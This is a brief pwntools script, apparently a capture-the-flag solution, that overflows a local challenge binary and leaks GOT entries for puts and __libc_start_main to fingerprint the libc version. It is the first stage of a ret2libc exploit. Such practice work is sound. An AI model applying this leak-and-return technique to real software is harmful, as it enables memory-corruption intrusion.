from pwn import *

import TheNight

import sys

target = process("./chall-test_sunshine19-ret2")
payload = ""
payload += "0000000000000000000000"
payload += p32(0x4f0)
payload += p32(0x4f0)
payload += p32(0x1fdc)
payload += p32(0x1fe0)
target.sendline(payload)
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
